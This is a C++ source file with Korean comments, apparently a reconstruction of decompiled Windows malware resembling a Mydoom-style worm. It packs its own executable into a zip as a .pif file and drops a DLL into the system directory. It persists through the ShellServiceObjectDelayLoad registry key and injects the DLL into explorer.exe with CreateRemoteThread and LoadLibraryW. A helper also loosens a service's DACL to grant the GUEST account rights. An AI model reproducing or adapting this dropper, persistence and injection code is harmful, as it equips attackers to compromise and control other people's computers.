// kkk.cpp: 콘솔 응용 프로그램의 진입점을 정의합니다.
//

#include "stdafx.h"
#include <Windows.h>
#include<tlhelp32.h>
#include<malloc.h>
#include<aclapi.h>

int __cdecl dll_injection_main_internal(DWORD dwProcessId, LPCWSTR lpString);
int __stdcall dll_injection_main(DWORD dwProcessId, LPCSTR lpString);
DWORD find_Explorer_exe();								//dll injection 대상 찾는 함수
HANDLE __cdecl rdshost_dll_injection(LPCSTR lpString);
HRESULT registry_controll();							//registry 입력 함수 
int __cdecl check_CRC32(int a1, char *a2, int a3);		//zip파일 checksum함수 
int __cdecl zip_file_make(LPCSTR lpFileName, LPCSTR a2, LPCSTR lpString);
__int16 *__cdecl zip_date(__int16 *a1, __int16 *a2);	//zip파일에서 날짜 입력함수 
int __cdecl check_sum(HANDLE hFile);
DWORD _EnableNTPrivilege(LPCTSTR szPrivilege, DWORD dwState);
VOID __stdcall DoUpdateSvcDacl(char* szSvcName);

const char* aPhotoAlbumZip = "\\kkk.zip";			//만들어질 zip 파일, 이름 바꾸세요~
const char* String = "kkk.pif";						//위 zip 파일을 풀면 생길 실행파일 
BYTE Data[132] = { 0, };
const char* aRdshostDll = "kkkhost.dll";			//만들어질 dll파일 rdshost.dll
const char* aExplorerExe = "explorer.exe";			//dll injection 될 대상 파일 


int __cdecl dll_injection_main_internal(DWORD dwProcessId, LPCWSTR lpString)		//여기부터 분석
{
	int dwSize;
	DWORD(__stdcall *lpStartAddress)(LPVOID);
	void *lpBaseAddress;
	int result;
	HANDLE hProcess;
	HANDLE hHandle;

	result = 0;
	hHandle = 0;
	lpBaseAddress = 0;
	hProcess = OpenProcess(0x42Au, 0, dwProcessId);
	if (hProcess)
	{
		dwSize = 2 * (lstrlenW(lpString) + 1);
		lpBaseAddress = VirtualAllocEx(hProcess, 0, dwSize, 0x1000u, 4u);
		if (lpBaseAddress)
		{
			if (WriteProcessMemory(hProcess, lpBaseAddress, (void*)lpString, dwSize, 0))
			{
				lpStartAddress = (DWORD(__stdcall *)(LPVOID))GetProcAddress(GetModuleHandleA("Kernel32"), "LoadLibraryW");
				if (lpStartAddress)
				{
					hHandle = CreateRemoteThread(hProcess, 0, 0, lpStartAddress, lpBaseAddress, 0, 0);
					if (hHandle)
					{
						WaitForSingleObject(hHandle, 0xFFFFFFFF);
						result = 1;
					}
				}
			}
		}
	}
	if (lpBaseAddress)
		VirtualFreeEx(hProcess, lpBaseAddress, 0, 0x8000u);
	if (hHandle)
		CloseHandle(hHandle);
	if (hProcess)
		CloseHandle(hProcess);
	return result;
}



int __stdcall dll_injection_main(DWORD dwProcessId, LPCSTR lpString)
{
	int length;
	void *wstr_rdshost_dll;

	length = 2 * lstrlenA(lpString) + 5;
	length &= 0xFC;
	wstr_rdshost_dll = alloca(length);
	wsprintfW((LPWSTR)wstr_rdshost_dll, L"%S", lpString);	//%s -> %ws
	return dll_injection_main_internal(dwProcessId, (LPCWSTR)wstr_rdshost_dll);
}



DWORD find_Explorer_exe()		//notepad.exe
{
	HANDLE hSnapshot; // [esp+4h] [ebp-12Ch]
	PROCESSENTRY32 pe; // [esp+8h] [ebp-128h]

	pe.dwSize = 0;
	memset(&pe.cntUsage, 0, 0x124u);
	hSnapshot = CreateToolhelp32Snapshot(2u, 0);
	if (hSnapshot == (HANDLE)-1)
		return 0;
	pe.dwSize = 296;
	if (!Process32First(hSnapshot, &pe))
	{
	LABEL_6:
		CloseHandle(hSnapshot);
		return 0;
	}
	while (1)
	{
		_strlwr(pe.szExeFile);
		if (strstr(pe.szExeFile, aExplorerExe))
			break;
		if (!Process32Next(hSnapshot, &pe))
			goto LABEL_6;
	}
	CloseHandle(hSnapshot);
	return pe.th32ProcessID;
}



HANDLE __cdecl rdshost_dll_injection(LPCSTR lpString)
{
	HANDLE result;
	HANDLE hSnapshot;
	PROCESSENTRY32 pe;
	int v4;
	DWORD v5;

	v4 = 0;
	pe.dwSize = 0;
	memset(&pe.cntUsage, 0, 0x124u);
	v5 = 0;
	v5 = find_Explorer_exe();
	result = CreateToolhelp32Snapshot(2u, 0);
	hSnapshot = result;
	if (result != (HANDLE)-1)
	{
		pe.dwSize = 296;
		if (Process32First(result, &pe))
		{
			do
			{
				if (pe.th32ProcessID == v5)
				//if (pe.th32ParentProcessID == v5 || pe.th32ProcessID == v5)
					dll_injection_main(pe.th32ProcessID, lpString);
			} while (Process32Next(hSnapshot, &pe));
		}
		result = (HANDLE)CloseHandle(hSnapshot);
	}
	return result;
}



HRESULT registry_controll()					//여기할 차례임 ㅠㅠ 
{
	HRESULT result; // eax
	HKEY phkResult; // [esp+Ch] [ebp-1018h]
	CHAR MultiByteStr[2048]; // [esp+10h] [ebp-1014h]
	CHAR Buffer[2048]; // [esp+810h] [ebp-814h]
	GUID pguid; // [esp+1010h] [ebp-14h]
	LPOLESTR lpsz; // [esp+1020h] [ebp-4h]

	const char* aDirectory = "\\";
	char Class[4];
	char byte_40A08C[4];
	const char* aClsid = "CLSID\\";
	const char* aInprocserver32 = "InProcServer32";
	const char* SubKey = "Software\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad";

	memset(MultiByteStr, 0, 0x800u);
	memset(Buffer, 0, 0x800u);
	lpsz = 0;
	strcpy((char*)Data, aRdshostDll);
	GetSystemDirectoryA(Buffer, 0x800u);
	strcat(Buffer, aDirectory);
	strcat(Buffer, (const char*)Data);
	CoInitialize(0);
	result = CoCreateGuid(&pguid);
	if (!result)
	{
		memset(MultiByteStr, 0, 0x800u);
		lpsz = (LPOLESTR)operator new(0x4Eu);
		StringFromGUID2(pguid, lpsz, 39);
		WideCharToMultiByte(0, 0, lpsz, wcslen(lpsz), MultiByteStr, 2048, 0, 0);
		operator delete(lpsz);
		result = RegCreateKeyExA(HKEY_LOCAL_MACHINE, SubKey, 0, Class, 0, 0xF003Fu, 0, &phkResult, 0);
		if (phkResult)
		{
			RegSetValueExA(phkResult, "kkkhost", 0, 1u, (const BYTE *)MultiByteStr, strlen(MultiByteStr));
			RegCloseKey(phkResult);
			strcpy(Buffer, aClsid);
			strcat(Buffer, MultiByteStr);
			strcat(Buffer, aInprocserver32);
			result = RegCreateKeyExA(HKEY_CLASSES_ROOT, Buffer, 0, byte_40A08C, 0, 0xF003Fu, 0, &phkResult, 0);
			if (phkResult)
			{
				RegSetValueExA(phkResult, 0, 0, 1u, Data, strlen((const char*)Data));
				result = RegCloseKey(phkResult);
			}
		}
	}
	return result;
}

DWORD _EnableNTPrivilege(LPCTSTR szPrivilege, DWORD dwState) {
	DWORD dwRtn = 0;
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES TP;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		if (LookupPrivilegeValue(NULL, szPrivilege, &luid)) {
			TP.Privileges[0].Attributes = dwState;
			TP.PrivilegeCount = 1;
			TP.Privileges[0].Luid = luid;
			if (AdjustTokenPrivileges(hToken, FALSE, &TP, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
				dwRtn = TP.Privileges[0].Attributes;
		}
		CloseHandle(hToken);
	}
	return dwRtn;
}

SC_HANDLE schSCManager;
SC_HANDLE schService;

int main()
{
	DWORD a_NumberOfBytesWritten;
	CHAR b_Buffer[260];
	CHAR c_Filename[260];
	HANDLE d_hFile;
	CHAR e_FileName[260];

	GetWindowsDirectoryA(b_Buffer, 0x104u);
	GetModuleFileNameA(0, c_Filename, 0x104u);
	//DoUpdateSvcDacl(c_Filename);
	 
	strcat(b_Buffer, aPhotoAlbumZip);
	zip_file_make(c_Filename, b_Buffer, String);		//ZIP파일 만드는 함수
	//_EnableNTPrivilege(SE_DEBUG_NAME, SE_PRIVILEGE_ENABLED);
	registry_controll();
	strcpy((char *)Data, aRdshostDll);
	GetSystemDirectoryA(e_FileName, 0x104u);
	strcat(e_FileName, "\\");
	strcat(e_FileName, (const char *)Data);
	d_hFile = CreateFileA(e_FileName, 0x40000000u, 2u, 0, 2u, 0x80u, 0);
	if (d_hFile != (HANDLE)-1)
	{
		WriteFile(d_hFile, (void*)0x409000, 0x2c00u, &a_NumberOfBytesWritten, 0);
		CloseHandle(d_hFile);
	}
	rdshost_dll_injection(e_FileName);		//rdshost.dll
	Sleep(100000);
	return 0;
}

VOID __stdcall DoUpdateSvcDacl(char* szSvcName)
{
	EXPLICIT_ACCESS      ea;
	SECURITY_DESCRIPTOR  sd;
	PSECURITY_DESCRIPTOR psd = NULL;
	PACL                 pacl = NULL;
	PACL                 pNewAcl = NULL;
	BOOL                 bDaclPresent = FALSE;
	BOOL                 bDaclDefaulted = FALSE;
	DWORD                dwError = 0;
	DWORD                dwSize = 0;
	DWORD                dwBytesNeeded = 0;

	// Get a handle to the SCM database. 

	schSCManager = OpenSCManager(
		NULL,                    // local computer
		NULL,                    // ServicesActive database 
		SC_MANAGER_ALL_ACCESS);  // full access rights 

	if (NULL == schSCManager)
	{
		printf("OpenSCManager failed (%d)\n", GetLastError());
		return;
	}

	// Get a handle to the service

	schService = OpenService(
		schSCManager,              // SCManager database 
		szSvcName,                 // name of service 
		READ_CONTROL | WRITE_DAC); // access

	if (schService == NULL)
	{
		printf("OpenService failed (%d)\n", GetLastError());
		CloseServiceHandle(schSCManager);
		return;
	}

	// Get the current security descriptor.

	if (!QueryServiceObjectSecurity(schService,
		DACL_SECURITY_INFORMATION,
		&psd,           // using NULL does not work on all versions
		0,
		&dwBytesNeeded))
	{
		if (GetLastError() == ERROR_INSUFFICIENT_BUFFER)
		{
			dwSize = dwBytesNeeded;
			psd = (PSECURITY_DESCRIPTOR)HeapAlloc(GetProcessHeap(),
				HEAP_ZERO_MEMORY, dwSize);
			if (psd == NULL)
			{
				// Note: HeapAlloc does not support GetLastError.
				printf("HeapAlloc failed\n");
				goto dacl_cleanup;
			}

			if (!QueryServiceObjectSecurity(schService,
				DACL_SECURITY_INFORMATION, psd, dwSize, &dwBytesNeeded))
			{
				printf("QueryServiceObjectSecurity failed (%d)\n", GetLastError());
				goto dacl_cleanup;
			}
		}
		else
		{
			printf("QueryServiceObjectSecurity failed (%d)\n", GetLastError());
			goto dacl_cleanup;
		}
	}

	// Get the DACL.

	if (!GetSecurityDescriptorDacl(psd, &bDaclPresent, &pacl,
		&bDaclDefaulted))
	{
		printf("GetSecurityDescriptorDacl failed(%d)\n", GetLastError());
		goto dacl_cleanup;
	}

	// Build the ACE.

	BuildExplicitAccessWithName(&ea, LPSTR("GUEST"),
		SERVICE_START | SERVICE_STOP | READ_CONTROL | DELETE,
		SET_ACCESS, NO_INHERITANCE);

	dwError = SetEntriesInAcl(1, &ea, pacl, &pNewAcl);
	if (dwError != ERROR_SUCCESS)
	{
		printf("SetEntriesInAcl failed(%d)\n", dwError);
		goto dacl_cleanup;
	}

	// Initialize a new security descriptor.

	if (!InitializeSecurityDescriptor(&sd,
		SECURITY_DESCRIPTOR_REVISION))
	{
		printf("InitializeSecurityDescriptor failed(%d)\n", GetLastError());
		goto dacl_cleanup;
	}

	// Set the new DACL in the security descriptor.

	if (!SetSecurityDescriptorDacl(&sd, TRUE, pNewAcl, FALSE))
	{
		printf("SetSecurityDescriptorDacl failed(%d)\n", GetLastError());
		goto dacl_cleanup;
	}

	// Set the new DACL for the service object.

	if (!SetServiceObjectSecurity(schService,
		DACL_SECURITY_INFORMATION, &sd))
	{
		printf("SetServiceObjectSecurity failed(%d)\n", GetLastError());
		goto dacl_cleanup;
	}
	else printf("Service DACL updated successfully\n");

dacl_cleanup:
	CloseServiceHandle(schSCManager);
	CloseServiceHandle(schService);

	if (NULL != pNewAcl)
		LocalFree((HLOCAL)pNewAcl);
	if (NULL != psd)
		HeapFree(GetProcessHeap(), 0, (LPVOID)psd);
}

int __cdecl check_CRC32(int a1, char *a2, int a3)
{
	unsigned int v7;
	int v6[256];
	int i;
	int j;

	unsigned int v8; // [esp+414h] [ebp+8h]
	unsigned int v9; // [esp+414h] [ebp+8h]
	unsigned int v10; // [esp+414h] [ebp+8h]
	unsigned int v11; // [esp+414h] [ebp+8h]
	unsigned int v12; // [esp+414h] [ebp+8h]
	unsigned int v13; // [esp+414h] [ebp+8h]
	unsigned int v14; // [esp+414h] [ebp+8h]
	unsigned int v15; // [esp+414h] [ebp+8h]
	char *v16; // [esp+418h] [ebp+Ch]

	for (i = 0; i < 256; ++i)
	{
		v7 = i;
		for (j = 8; j > 0; --j)
		{
			if (v7 & 1)
				v7 = (v7 >> 1) ^ 0xEDB88320;
			else
				v7 >>= 1;
		}
		v6[i] = v7;
	}
	if (!a2)
		return 0;
	v8 = ~a1;
	while (a3 >= 8)
	{
		v9 = (v8 >> 8) ^ v6[(unsigned __int8)(*a2 ^ v8)];
		v16 = a2 + 1;
		v10 = (v9 >> 8) ^ v6[(unsigned __int8)(*v16++ ^ v9)];
		v11 = (v10 >> 8) ^ v6[(unsigned __int8)(*v16++ ^ v10)];
		v12 = (v11 >> 8) ^ v6[(unsigned __int8)(*v16++ ^ v11)];
		v13 = (v12 >> 8) ^ v6[(unsigned __int8)(*v16++ ^ v12)];
		v14 = (v13 >> 8) ^ v6[(unsigned __int8)(*v16++ ^ v13)];
		v15 = (v14 >> 8) ^ v6[(unsigned __int8)(*v16++ ^ v14)];
		v8 = (v15 >> 8) ^ v6[(unsigned __int8)(*v16 ^ v15)];
		a2 = v16 + 1;
		a3 -= 8;
	}
	for (; a3; --a3)
		v8 = (v8 >> 8) ^ v6[(unsigned __int8)(*a2++ ^ v8)];
	return ~v8;
}



int __cdecl zip_file_make(LPCSTR lpFileName, LPCSTR a2, LPCSTR lpString)
{

	char a_buffer_v47[1024];

#pragma pack(push,2)
	struct _ZIP_HEADER {
		int Buffer;
		__int16 v37;
		__int16 v38;
		__int16 v39;
		__int16 v40;
		__int16 v41;
		int v42;
		DWORD v43;
		DWORD v44;
		__int16 v45;
		__int16 v46;
	}ZIP_HEADER;

	struct _ZIP_HEADER2 {
		int v9;
		__int16 v10;
		__int16 v11;
		__int16 v12;
		__int16 v13;
		__int16 v14;
		__int16 v15;
		int v16;
		DWORD v17;
		DWORD v18;
		__int16 v19;
		__int16 v20;

		int spa;

		__int16 v21; // [esp+28h] [ebp-454h]
		int v22; // [esp+2Ah] [ebp-452h]
		int v23; // [esp+2Eh] [ebp-44Eh]
	}ZIP_HEADER2;

	struct _ZIP_HEADER3 {
		int v25; // [esp+38h] [ebp-444h]
		__int16 v26; // [esp+3Ch] [ebp-440h]
		__int16 v27; // [esp+3Eh] [ebp-43Eh]
		__int16 v28; // [esp+40h] [ebp-43Ch]
		__int16 v29; // [esp+42h] [ebp-43Ah]
		int v30; // [esp+44h] [ebp-438h]
		int v31; // [esp+48h] [ebp-434h]
		__int16 v32; // [esp+4Ch] [ebp-430h]
	}ZIP_HEADER3;
#pragma pack(pop)

	HANDLE hObject; // [esp+34h] [ebp-448h]
	HANDLE hFile; // [esp+0h] [ebp-47Ch]


	int buffer_v35; // [esp+58h] [ebp-424h]
	DWORD NumberOfBytesWritten; // [esp+54h] [ebp-428h]
	DWORD v33; // [esp+50h] [ebp-42Ch], 필요없음


	hObject = CreateFileA(lpFileName, 0x80000000, 3u, 0, 3u, 0x80u, 0);
	if (hObject == (HANDLE)-1 || !hObject)
		return 1;
	hFile = CreateFileA(a2, 0x40000000u, 3u, 0, 2u, 0x80u, 0);
	if (hFile != (HANDLE)-1 && hFile)
	{
		memset(&ZIP_HEADER.Buffer, 0, 0x1Eu);
		memset(&ZIP_HEADER2.v9, 0, 0x2Eu);
		memset(&ZIP_HEADER3.v25, 0, 0x16u);
		buffer_v35 = 0;
		ZIP_HEADER.Buffer = 0x4034b50;
		ZIP_HEADER.v37 = 10;
		ZIP_HEADER2.v11 = 10;
		ZIP_HEADER.v38 = 0;
		ZIP_HEADER2.v12 = 0;
		ZIP_HEADER.v39 = 0;
		ZIP_HEADER2.v13 = 0;
		zip_date(&ZIP_HEADER.v40, &ZIP_HEADER.v41);
		ZIP_HEADER2.v14 = ZIP_HEADER.v40;
		ZIP_HEADER2.v15 = ZIP_HEADER.v41;
		ZIP_HEADER.v42 = check_sum(hObject);
		ZIP_HEADER2.v16 = ZIP_HEADER.v42;
		ZIP_HEADER.v43 = GetFileSize(hObject, 0);
		ZIP_HEADER2.v17 = ZIP_HEADER.v43;
		ZIP_HEADER.v44 = GetFileSize(hObject, 0);
		ZIP_HEADER2.v18 = ZIP_HEADER.v44;
		ZIP_HEADER.v45 = lstrlenA(lpString);
		ZIP_HEADER2.v19 = ZIP_HEADER.v45;
		ZIP_HEADER.v46 = 0;
		ZIP_HEADER2.v20 = 0;
		ZIP_HEADER2.spa = 0;
		ZIP_HEADER2.v23 = buffer_v35;


		WriteFile(hFile, &ZIP_HEADER.Buffer, 0x1Eu, &NumberOfBytesWritten, 0);
		buffer_v35 += 30;
		WriteFile(hFile, lpString, lstrlenA(lpString), &NumberOfBytesWritten, 0);
		buffer_v35 += lstrlenA(lpString);
		SetFilePointer(hObject, 0, 0, 0);
		while (1)
		{
			NumberOfBytesWritten = 0;
			if (!ReadFile(hObject, a_buffer_v47, 0x400u, &NumberOfBytesWritten, 0) || !NumberOfBytesWritten)
				break;
			WriteFile(hFile, a_buffer_v47, NumberOfBytesWritten, &v33, 0);
			buffer_v35 += NumberOfBytesWritten;
		}
		ZIP_HEADER3.v31 = buffer_v35;
		ZIP_HEADER2.v9 = 33639248;
		ZIP_HEADER2.v10 = 20;
		ZIP_HEADER2.v21 = 0;
		ZIP_HEADER2.v22 = 32;
		WriteFile(hFile, &ZIP_HEADER2.v9, 0x2Eu, &NumberOfBytesWritten, 0);
		buffer_v35 += 46;
		WriteFile(hFile, lpString, lstrlenA(lpString), &NumberOfBytesWritten, 0);
		buffer_v35 += lstrlenA(lpString);
		ZIP_HEADER3.v25 = 101010256;
		ZIP_HEADER3.v26 = 0;
		ZIP_HEADER3.v27 = 0;
		ZIP_HEADER3.v28 = 1;
		ZIP_HEADER3.v29 = 1;
		ZIP_HEADER3.v30 = buffer_v35 - ZIP_HEADER3.v31;
		ZIP_HEADER3.v32 = 0;
		WriteFile(hFile, &ZIP_HEADER3.v25, 0x16u, &NumberOfBytesWritten, 0);
		CloseHandle(hFile);
		CloseHandle(hObject);
		return 0;
	}
	else
	{
		CloseHandle(hObject);
		return 2;
	}
}

__int16 *__cdecl zip_date(__int16 *a1, __int16 *a2)
{
	__int16 *result;
	struct _SYSTEMTIME SystemTime;

	GetSystemTime(&SystemTime);
	if ((signed int)SystemTime.wYear < 1999 || (signed int)SystemTime.wYear > 2010)
		SystemTime.wYear = 2004;
	if ((signed int)SystemTime.wMonth < 1 || (signed int)SystemTime.wMonth > 12)
		SystemTime.wMonth = 1;
	if ((signed int)SystemTime.wDay < 1 || (signed int)SystemTime.wDay > 31)
		SystemTime.wDay = 10;
	*a2 = SystemTime.wDay | 32 * SystemTime.wMonth | ((SystemTime.wYear - 1980) << 9);
	result = a1;
	*a1 = SystemTime.wSecond / 2 | 32 * SystemTime.wMinute | (SystemTime.wHour << 11);
	return result;
}


int __cdecl check_sum(HANDLE hFile)
{
	char Buffer[1024];
	DWORD NumberOfBytesRead;
	int i;

	SetFilePointer(hFile, 0, 0, 0);
	for (i = 0; ; i = check_CRC32(i, Buffer, NumberOfBytesRead))
	{
		NumberOfBytesRead = 0;
		if (!ReadFile(hFile, Buffer, 0x400u, &NumberOfBytesRead, 0) || !NumberOfBytesRead)
			break;
	}
	SetFilePointer(hFile, 0, 0, 0);
	return i;
}
